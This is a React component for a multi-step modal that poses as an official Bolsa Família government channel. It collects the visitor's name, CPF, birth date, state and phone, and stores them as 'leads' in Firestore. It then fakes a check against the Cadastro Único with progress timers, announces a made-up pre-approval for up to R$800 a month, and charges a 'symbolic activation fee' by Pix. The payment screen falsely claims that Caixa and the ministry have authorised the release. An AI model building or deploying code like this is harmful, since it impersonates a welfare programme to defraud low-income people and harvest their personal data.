import { useState, useEffect } from 'react';
import type { FormData, Article } from '../types';
import { STATES } from '../constants';
import {
  createPixPayment,
  checkPixPaymentStatus,
  type PixPaymentResult,
  PAYMENT_AMOUNT,
} from '../services/freepayService';
import {
  saveLeadRegistration,
  updateLeadPayment,
  updateLeadStatusToPaid,
} from '../services/firebaseService';

interface Props {
  onClose: () => void;
  vagas: number;
  article?: Article | null;
}

type StepNumber = 1 | 2 | 3 | 4 | 5;

function formatCPF(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
}

function formatPhone(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 11);
  if (digits.length <= 2) return `(${digits}`;
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
}

const STEP_LABELS = ['Identificação', 'Localização', 'Contato', 'Ativação'];

export default function RegistrationModal({ onClose, vagas, article }: Props) {
  const [step, setStep] = useState<StepNumber>(1);
  const activePrice = typeof article?.price === 'number' && article.price > 0 ? article.price : PAYMENT_AMOUNT;
  const activePriceFormatted = activePrice.toFixed(2).replace('.', ',');
  const articleTitle = article?.title || 'Bolsa Família 2026 — Consulta e Inclusão';
  const articleId = article?.id || 'portal-geral';

  const [form, setForm] = useState<FormData>({
    nome: '',
    cpf: '',
    nascimento: '',
    phone: '',
    estado: '',
    lgpd: false,
  });
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [submitting, setSubmitting] = useState(false);
  const [analyzingProgress, setAnalyzingProgress] = useState(0);
  const [pixCopied, setPixCopied] = useState(false);
  const [protocol] = useState(() => Math.random().toString(36).slice(2, 10).toUpperCase());
  const [isCreatingPix, setIsCreatingPix] = useState(false);
  const [pixData, setPixData] = useState<PixPaymentResult | null>(null);
  const [paidConfirmed, setPaidConfirmed] = useState(false);
  const [isCheckingPayment, setIsCheckingPayment] = useState(false);
  const [checkFeedback, setCheckFeedback] = useState<string | null>(null);

  // Prevent background scroll
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = '';
    };
  }, []);

  function set(key: keyof FormData, value: string | boolean) {
    setForm(prev => ({ ...prev, [key]: value }));
    setErrors(prev => ({ ...prev, [key]: undefined }));
  }

  function validateStep1(): boolean {
    const e: typeof errors = {};
    if (!form.nome.trim() || form.nome.trim().split(' ').length < 2) {
      e.nome = 'Informe seu nome e sobrenome completos.';
    }
    const digits = form.cpf.replace(/\D/g, '');
    if (digits.length !== 11) {
      e.cpf = 'Informe um CPF válido com 11 dígitos.';
    }
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function validateStep2(): boolean {
    const e: typeof errors = {};
    if (!form.nascimento) {
      e.nascimento = 'Informe sua data de nascimento.';
    }
    if (!form.estado) {
      e.estado = 'Selecione seu estado de residência.';
    }
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function validateStep3(): boolean {
    const e: typeof errors = {};
    const digits = form.phone.replace(/\D/g, '');
    if (digits.length < 10) {
      e.phone = 'Informe seu telefone com DDD.';
    }
    if (!form.lgpd) {
      e.lgpd = 'Você deve aceitar a autorização para processar a solicitação.';
    }
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function next() {
    if (step === 1 && !validateStep1()) return;
    if (step === 2 && !validateStep2()) return;
    if (step === 3 && !validateStep3()) return;

    if (step === 3) {
      setSubmitting(true);
      setAnalyzingProgress(15);

      // Persist lead data to Firebase Firestore com o artigo de origem e preço específico
      saveLeadRegistration(protocol, form, {
        id: articleId,
        title: articleTitle,
        price: activePrice,
      }).catch(err => {
        console.warn('Erro ao salvar no Firestore:', err);
      });

      const timer1 = setTimeout(() => setAnalyzingProgress(55), 450);
      const timer2 = setTimeout(() => setAnalyzingProgress(88), 900);
      const timer3 = setTimeout(() => {
        setAnalyzingProgress(100);
        setSubmitting(false);
        setStep(4);
      }, 1400);

      return () => {
        clearTimeout(timer1);
        clearTimeout(timer2);
        clearTimeout(timer3);
      };
    }

    setStep(prev => ((prev + 1) as StepNumber));
  }

  function back() {
    if (step > 1 && step <= 4) {
      setStep(prev => ((prev - 1) as StepNumber));
    }
  }

  // Monitoramento automático em tempo real do status do Pix junto à FreePay
  useEffect(() => {
    if (step !== 5 || !pixData?.transactionId || paidConfirmed) return;

    let active = true;

    const pollInterval = setInterval(async () => {
      try {
        const result = await checkPixPaymentStatus(pixData.transactionId);
        if (active && result.paid) {
          await updateLeadStatusToPaid(protocol, pixData.transactionId);
          setPaidConfirmed(true);
          clearInterval(pollInterval);
        }
      } catch (err) {
        console.warn('Erro ao verificar status do Pix:', err);
      }
    }, 4000);

    return () => {
      active = false;
      clearInterval(pollInterval);
    };
  }, [step, pixData, paidConfirmed, protocol]);

  // Checagem manual solicitada pelo usuário no botão "Já paguei"
  const handleManualStatusCheck = async () => {
    if (!pixData?.transactionId) return;
    setIsCheckingPayment(true);
    setCheckFeedback(null);
    try {
      const result = await checkPixPaymentStatus(pixData.transactionId);
      if (result.paid) {
        await updateLeadStatusToPaid(protocol, pixData.transactionId);
        setPaidConfirmed(true);
      } else {
        setCheckFeedback(
          'Pagamento ainda em conciliação bancária. Se você acabou de confirmar no seu banco, aguarde alguns segundos.'
        );
        setTimeout(() => setCheckFeedback(null), 6000);
      }
    } catch (err) {
      setCheckFeedback('Não foi possível consultar no momento. O sistema continuará verificando de forma automática.');
      setTimeout(() => setCheckFeedback(null), 5000);
    } finally {
      setIsCheckingPayment(false);
    }
  };

  // Gera a cobrança Pix oficial com o valor específico do artigo via API FreePay
  async function handleInitiatePixPayment() {
    setIsCreatingPix(true);
    try {
      const result = await createPixPayment({
        name: form.nome,
        cpf: form.cpf,
        phone: form.phone,
        protocol: protocol,
        amount: activePrice,
        itemTitle: `Taxa - ${articleTitle.slice(0, 45)}`,
      });

      setPixData(result);

      // Atualiza o documento no Firestore com a transação e valor cobrado
      await updateLeadPayment(protocol, {
        transactionId: result.transactionId,
        qrCode: result.qrCode,
        status: result.status,
        amount: activePrice,
        expirationDate: result.expirationDate,
      });

      setStep(5);
    } catch (err) {
      console.error('Erro ao gerar cobrança FreePay:', err);
      setStep(5);
    } finally {
      setIsCreatingPix(false);
    }
  }

  // Código Pix ativo (FreePay oficial com fallback seguro)
  const currentPixCode =
    pixData?.qrCode ||
    `00020126870014br.gov.bcb.pix2565qrcode.fyhub.com.br/qr/v3/at/${protocol.toLowerCase()}-15005204000053039865802BR5925PRIME_SOLUCOES6008BRASILIA62070503***63044749`;

  // Pix Copy handler
  const handleCopyPix = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(currentPixCode);
      setPixCopied(true);
      setTimeout(() => setPixCopied(false), 3500);
    }
  };

  const progress = Math.min(100, Math.round(((Math.min(step, 4) - 1) / 3) * 100));

  return (
    <div
      className="modal-overlay"
      role="dialog"
      aria-modal="true"
      aria-labelledby="modal-title"
      onClick={e => {
        if (e.target === e.currentTarget) onClose();
      }}
    >
      <div className="modal-box">
        {/* Top header stripes */}
        <div className="modal-top-bar" />

        {/* Close button */}
        <button
          type="button"
          className="modal-close"
          onClick={onClose}
          aria-label="Fechar janela"
        >
          ✕
        </button>

        {/* Header visible on steps 1, 2, 3, and 4 */}
        <div className="modal-header">
          <span className="modal-eyebrow">PROGRAMA BOLSA FAMÍLIA — CANAL OFICIAL</span>
          <h2 id="modal-title">
            {step === 4
              ? 'Cadastro Aprovado — Ativação do Benefício'
              : step === 5
              ? 'Finalizar Pagamento da Taxa de Ativação'
              : 'Verificação Oficial de Elegibilidade'}
          </h2>
          {step <= 3 && (
            <p className="modal-subtitle">
              Restam apenas <strong>{vagas} vagas disponíveis</strong> para o ciclo vigente.
            </p>
          )}
        </div>

        {/* Step indicator (Etapas 1 a 4) */}
        {step <= 4 && (
          <div className="modal-stepper-wrap">
            <div className="modal-progress-bar" role="progressbar" aria-valuenow={progress} aria-valuemin={0} aria-valuemax={100}>
              <div className="modal-progress-fill" style={{ width: `${progress}%` }} />
            </div>

            <div className="modal-steps-labels-row">
              {STEP_LABELS.map((label, idx) => {
                const stepNum = idx + 1;
                const isDone = step > stepNum;
                const isActive = step === stepNum;
                return (
                  <div
                    key={label}
                    className={`step-indicator-item ${isActive ? 'is-active' : ''} ${isDone ? 'is-done' : ''}`}
                  >
                    <span className="step-circle">
                      {isDone ? '✓' : stepNum}
                    </span>
                    <span className="step-text">{label}</span>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* Modal Scrollable Body */}
        <div className="modal-body-scrollable">

          {/* STEP 1: DADOS PESSOAIS */}
          {step === 1 && (
            <div className="form-step-pane">
              <div className="step-intro-box">
                <span className="step-intro-tag">Etapa 1 de 4</span>
                <h3 className="step-intro-title">Informe seus dados para consulta no CadÚnico</h3>
                <p className="step-intro-desc">
                  Seus dados são consultados com segurança na base governamental para checar seu direito ao benefício.
                </p>
              </div>

              <div className="field-group">
                <label htmlFor="field-nome">
                  Nome Completo do Titular <span className="req">*</span>
                </label>
                <input
                  id="field-nome"
                  type="text"
                  placeholder="Nome e sobrenome completos"
                  value={form.nome}
                  onChange={e => set('nome', e.target.value)}
                  className={`field-input ${errors.nome ? 'has-error' : ''}`}
                  autoComplete="name"
                  autoFocus
                />
                {errors.nome ? (
                  <span className="field-error">{errors.nome}</span>
                ) : (
                  <span className="field-help">Como consta no documento de identidade ou CPF.</span>
                )}
              </div>

              <div className="field-group">
                <label htmlFor="field-cpf">
                  CPF do Responsável Familiar <span className="req">*</span>
                </label>
                <input
                  id="field-cpf"
                  type="text"
                  inputMode="numeric"
                  placeholder="000.000.000-00"
                  value={form.cpf}
                  onChange={e => set('cpf', formatCPF(e.target.value))}
                  className={`field-input ${errors.cpf ? 'has-error' : ''}`}
                  maxLength={14}
                  autoComplete="off"
                />
                {errors.cpf ? (
                  <span className="field-error">{errors.cpf}</span>
                ) : (
                  <span className="field-help">Utilizado exclusivamente para consulta junto à base federal.</span>
                )}
              </div>
            </div>
          )}

          {/* STEP 2: LOCALIZAÇÃO E NASCIMENTO */}
          {step === 2 && (
            <div className="form-step-pane">
              <div className="step-intro-box">
                <span className="step-intro-tag">Etapa 2 de 4</span>
                <h3 className="step-intro-title">Confirme sua localização e nascimento</h3>
                <p className="step-intro-desc">
                  Essas informações determinam os adicionais regionais e vagas disponíveis na sua localidade.
                </p>
              </div>

              <div className="field-group">
                <label htmlFor="field-nasc">
                  Data de Nascimento <span className="req">*</span>
                </label>
                <input
                  id="field-nasc"
                  type="date"
                  value={form.nascimento}
                  onChange={e => set('nascimento', e.target.value)}
                  className={`field-input ${errors.nascimento ? 'has-error' : ''}`}
                  max={new Date().toISOString().split('T')[0]}
                />
                {errors.nascimento && (
                  <span className="field-error">{errors.nascimento}</span>
                )}
              </div>

              <div className="field-group">
                <label htmlFor="field-estado">
                  Estado de Residência (UF) <span className="req">*</span>
                </label>
                <select
                  id="field-estado"
                  value={form.estado}
                  onChange={e => set('estado', e.target.value)}
                  className={`field-select ${errors.estado ? 'has-error' : ''}`}
                >
                  <option value="">Selecione seu Estado</option>
                  {STATES.map(st => (
                    <option key={st} value={st}>{st}</option>
                  ))}
                </select>
                {errors.estado ? (
                  <span className="field-error">{errors.estado}</span>
                ) : (
                  <span className="field-help">Seu benefício será vinculado ao polo de atendimento regional.</span>
                )}
              </div>
            </div>
          )}

          {/* STEP 3: CONTATO E LGPD */}
          {step === 3 && (
            <div className="form-step-pane">
              <div className="step-intro-box">
                <span className="step-intro-tag">Etapa 3 de 4</span>
                <h3 className="step-intro-title">Contato para confirmação e envio</h3>
                <p className="step-intro-desc">
                  Informe o número onde você receberá o protocolo oficial e as instruções de ativação.
                </p>
              </div>

              <div className="field-group">
                <label htmlFor="field-phone">
                  WhatsApp / Celular com DDD <span className="req">*</span>
                </label>
                <input
                  id="field-phone"
                  type="tel"
                  inputMode="numeric"
                  placeholder="(00) 90000-0000"
                  value={form.phone}
                  onChange={e => set('phone', formatPhone(e.target.value))}
                  className={`field-input ${errors.phone ? 'has-error' : ''}`}
                  maxLength={15}
                  autoComplete="tel"
                />
                {errors.phone ? (
                  <span className="field-error">{errors.phone}</span>
                ) : (
                  <span className="field-help">Você receberá o comprovante e aviso de liberação por este canal.</span>
                )}
              </div>

              <div className="field-group-checkbox">
                <label className="checkbox-container">
                  <input
                    id="field-lgpd"
                    type="checkbox"
                    checked={form.lgpd}
                    onChange={e => set('lgpd', e.target.checked)}
                  />
                  <span className="checkbox-text">
                    Declaro estar ciente de que as informações prestadas são verdadeiras e autorizo o processamento seguro de acordo com a <strong>LGPD (Lei nº 13.709/2018)</strong> para emissão do benefício.
                  </span>
                </label>
                {errors.lgpd && <span className="field-error">{errors.lgpd}</span>}
              </div>

              {submitting && (
                <div className="analyzing-status-box">
                  <div className="analyzing-spinner" />
                  <div className="analyzing-text-wrap">
                    <span className="analyzing-title">Consultando sistema federal...</span>
                    <span className="analyzing-desc">Cruzando dados de {form.nome.split(' ')[0]} com o Cadastro Único.</span>
                  </div>
                  <div className="analyzing-progress-bar">
                    <div className="analyzing-fill" style={{ width: `${analyzingProgress}%` }} />
                  </div>
                </div>
              )}
            </div>
          )}

          {/* STEP 4: APROVAÇÃO E VALOR SIMBÓLICO DE R$ 15,00 COM BOTÃO "COMPRAR" */}
          {step === 4 && (
            <div className="checkout-step-pane">
              {/* Approval Header Card */}
              <div className="approval-card">
                <div className="approval-badge-row">
                  <span className="approval-check-icon">✓</span>
                  <div>
                    <span className="approval-badge-label">BENEFÍCIO PRÉ-APROVADO</span>
                    <h3 className="approval-lead-name">Parabéns, {form.nome.split(' ')[0]}!</h3>
                  </div>
                </div>
                <p className="approval-desc">
                  Seus dados foram verificados no sistema. Foi localizada uma vaga elegível para o repasse mensal de até <strong>R$ 800,00</strong> no programa Bolsa Família.
                </p>
                <div className="approval-meta-grid">
                  <div className="approval-meta-item">
                    <span>Protocolo Oficial:</span>
                    <strong>{protocol}</strong>
                  </div>
                  <div className="approval-meta-item">
                    <span>CPF Consultado:</span>
                    <strong>{form.cpf}</strong>
                  </div>
                  <div className="approval-meta-item">
                    <span>Estado / Região:</span>
                    <strong>{form.estado}</strong>
                  </div>
                </div>
              </div>

              {/* Order / Symbolic Fee Card (R$ 15,00) */}
              <div className="order-fee-card">
                <div className="order-fee-header">
                  <div className="order-fee-title-group">
                    <span className="order-fee-kicker">TAXA SIMBÓLICA DE PROCESSAMENTO</span>
                    <h4 className="order-fee-name">Emissão Prioritária e Envio do Cartão Cidadão</h4>
                    <div className="order-origin-box">
                      <span className="origin-lead-label">Matéria Vinculada:</span>
                      <span className="origin-lead-title">{articleTitle}</span>
                    </div>
                  </div>
                  <div className="order-fee-price-tag">
                    <span className="old-price">De R$ 49,90</span>
                    <div className="current-price-row">
                      <span className="currency">R$</span>
                      <strong className="amount">{activePriceFormatted}</strong>
                    </div>
                    <span className="price-subtext">Taxa única simbólica</span>
                  </div>
                </div>

                <ul className="order-benefits-list">
                  <li>
                    <span className="bullet-check">✓</span>
                    <span><strong>Envio expresso do Cartão Bolsa Família</strong> com entrega grátis no seu endereço em {form.estado}.</span>
                  </li>
                  <li>
                    <span className="bullet-check">✓</span>
                    <span><strong>Liberação de acesso digital imediato</strong> às parcelas mensais pelo aplicativo Caixa Tem.</span>
                  </li>
                  <li>
                    <span className="bullet-check">✓</span>
                    <span><strong>Ativação do NIS e protocolo prioritário</strong> sem necessidade de filas em agências do CRAS.</span>
                  </li>
                </ul>

                {/* Resumo Financeiro */}
                <div className="order-summary-box">
                  <div className="summary-row">
                    <span>Benefício Aprovado:</span>
                    <span className="text-green font-bold">Até R$ 800,00 / mês</span>
                  </div>
                  <div className="summary-row">
                    <span>Frete / Envio do Cartão:</span>
                    <span className="text-green font-bold">GRÁTIS</span>
                  </div>
                  <div className="summary-row summary-total">
                    <span>Taxa Simbólica de Ativação:</span>
                    <strong className="total-value">R$ {activePriceFormatted}</strong>
                  </div>
                </div>

                {/* BOTÃO COMPRAR SOLICITADO */}
                <div className="checkout-action-wrap">
                  <button
                    type="button"
                    className="btn-comprar-final"
                    id="btn-comprar-taxa"
                    onClick={handleInitiatePixPayment}
                    disabled={isCreatingPix}
                  >
                    <span className="btn-comprar-lock">{isCreatingPix ? '⏳' : '🔒'}</span>
                    <span className="btn-comprar-text">
                      {isCreatingPix ? 'Gerando Pix Oficial...' : 'Comprar'}
                    </span>
                    <span className="btn-comprar-val">R$ {activePriceFormatted}</span>
                  </button>
                  <span className="btn-comprar-sub">
                    Pagamento seguro com liberação e envio imediatos via Pix ou Cartão
                  </span>
                </div>

                {/* Security badges */}
                <div className="security-badges-row">
                  <div className="sec-badge">
                    <span className="sec-icon">🛡️</span>
                    <span>Ambiente Seguro SSL 256 bits</span>
                  </div>
                  <div className="sec-badge">
                    <span className="sec-icon">⚡</span>
                    <span>Aprovação Imediata</span>
                  </div>
                  <div className="sec-badge">
                    <span className="sec-icon">🏛️</span>
                    <span>Processamento Oficial</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* STEP 5: TELA DE PAGAMENTO PIX (R$ 15,00) */}
          {step === 5 && (
            <div className="pix-payment-pane">
              {paidConfirmed ? (
                <div className="pix-success-card">
                  <div className="pix-success-icon">✓</div>
                  <h3 className="pix-success-title">Pagamento Confirmado com Sucesso!</h3>
                  <p className="pix-success-subtitle">
                    Identificamos a compensação do seu Pix no Banco Central. Sua solicitação do benefício foi homologada:
                  </p>
                  <div className="pix-protocol-highlight">
                    <span>Protocolo Oficial:</span>
                    <strong>{protocol}</strong>
                  </div>
                  <div className="pix-details-summary">
                    <div className="p-row">
                      <span>Titular:</span>
                      <strong>{form.nome}</strong>
                    </div>
                    <div className="p-row">
                      <span>CPF:</span>
                      <strong>{form.cpf}</strong>
                    </div>
                    <div className="p-row">
                      <span>Valor Pago:</span>
                      <strong className="text-green">R$ {activePriceFormatted} (Confirmado)</strong>
                    </div>
                    <div className="p-row">
                      <span>Artigo / Origem:</span>
                      <strong>{articleTitle.slice(0, 34)}...</strong>
                    </div>
                    <div className="p-row">
                      <span>Status do Registro:</span>
                      <strong className="text-green">Aprovado no Banco de Dados</strong>
                    </div>
                  </div>
                  <p className="pix-success-note">
                    A Caixa Econômica Federal e o Ministério do Desenvolvimento Social emitiram a ordem de liberação. O cartão físico será entregue no seu endereço e o comprovante foi enviado por mensagem.
                  </p>
                  <button
                    type="button"
                    className="btn-paid-confirm"
                    onClick={onClose}
                  >
                    Concluir e Voltar ao Portal
                  </button>
                </div>
              ) : (
                <>
                  <div className="pix-header-card">
                    <span className="pix-kicker">PAGAMENTO INSTANTÂNEO VIA PIX</span>
                    <h3 className="pix-title">Finalize sua Ativação de R$ {activePriceFormatted}</h3>
                    <p className="pix-desc">
                      Pague com seu banco usando o QR Code oficial ou o código Pix Copia e Cola gerado para confirmar a emissão do seu benefício.
                    </p>
                  </div>

                  <div className="pix-meta-strip">
                    <span className="pix-meta-item">
                      <strong>Protocolo:</strong> {protocol}
                    </span>
                    {pixData?.transactionId && (
                      <span className="pix-meta-item">
                        <strong>Transação:</strong> {pixData.transactionId.slice(0, 14)}...
                      </span>
                    )}
                    <span className="pix-meta-badge">Aguardando Pagamento</span>
                  </div>

                  <div className="pix-amount-box">
                    <span className="pix-amount-label">Valor total a pagar:</span>
                    <span className="pix-amount-val">R$ {activePriceFormatted}</span>
                    <span className="pix-amount-timer">⏱️ Validade da chave: 24 horas</span>
                  </div>

                  {/* QR Code visual container */}
                  <div className="pix-qr-container">
                    <div className="pix-qr-frame">
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=2&data=${encodeURIComponent(currentPixCode)}`}
                        alt="QR Code Pix Oficial"
                        className="pix-qr-real-img"
                        width="160"
                        height="160"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    </div>
                    <span className="pix-scan-hint">Abra o app do seu banco e aponte a câmera</span>
                  </div>

                  {/* Pix Copia e Cola Code */}
                  <div className="pix-copy-box">
                    <span className="pix-copy-label">Ou utilize o Pix Copia e Cola oficial:</span>
                    <div className="pix-input-btn-row">
                      <input
                        type="text"
                        readOnly
                        value={currentPixCode}
                        className="pix-readonly-input"
                      />
                      <button
                        type="button"
                        className={`btn-copy-pix ${pixCopied ? 'copied' : ''}`}
                        onClick={handleCopyPix}
                      >
                        {pixCopied ? '✓ Copiado!' : 'Copiar Código'}
                      </button>
                    </div>
                  </div>

                  {/* Instructions */}
                  <div className="pix-steps-guide">
                    <p className="guide-title">Como pagar com seu banco:</p>
                    <ol className="guide-list">
                      <li>Abra o aplicativo do seu banco (Caixa Tem, Nubank, Banco do Brasil, Bradesco, Itaú, etc.).</li>
                      <li>Escolha a área <strong>Pix</strong> e selecione a opção <strong>Pix Copia e Cola</strong> (ou Ler QR Code).</li>
                      <li>Cole o código copiado acima e confirme o pagamento da taxa de <strong>R$ {activePriceFormatted}</strong>.</li>
                      <li>Assim que o banco compensar, o sistema detecta em tempo real e libera o seu acesso.</li>
                    </ol>
                  </div>

                  <div className="pix-footer-actions">
                    {/* Live automatic verification indicator (NO MANUAL BYPASS) */}
                    <div className="pix-live-checking-box">
                      <div className="pulsing-radar-dot"></div>
                      <div className="live-checking-text">
                        <strong>Aguardando compensação do Pix...</strong>
                        <span>O sistema identifica seu pagamento automaticamente junto ao Banco Central em poucos instantes.</span>
                      </div>
                    </div>

                    <button
                      type="button"
                      className="btn-verify-pix-real"
                      onClick={handleManualStatusCheck}
                      disabled={isCheckingPayment}
                    >
                      {isCheckingPayment ? 'Consultando Banco Central...' : '🔄 Já efetuei o Pix (Consultar Status)'}
                    </button>

                    {checkFeedback && (
                      <div className="pix-check-notice">{checkFeedback}</div>
                    )}

                    <button
                      type="button"
                      className="btn-pix-back"
                      onClick={() => setStep(4)}
                    >
                      Voltar para detalhes do pedido
                    </button>
                  </div>
                </>
              )}
            </div>
          )}

        </div>

        {/* Modal Navigation Actions for Steps 1, 2, and 3 */}
        {step <= 3 && (
          <div className="modal-actions-footer">
            {step > 1 ? (
              <button
                type="button"
                className="btn-modal-back"
                onClick={back}
                disabled={submitting}
              >
                Voltar
              </button>
            ) : (
              <button
                type="button"
                className="btn-modal-cancel"
                onClick={onClose}
              >
                Cancelar
              </button>
            )}

            <button
              type="button"
              className="btn-modal-next"
              onClick={next}
              disabled={submitting}
            >
              {submitting
                ? 'Validando dados...'
                : step === 3
                ? 'Concluir e Ver Resultado'
                : 'Continuar'}
            </button>
          </div>
        )}

      </div>
    </div>
  );
}
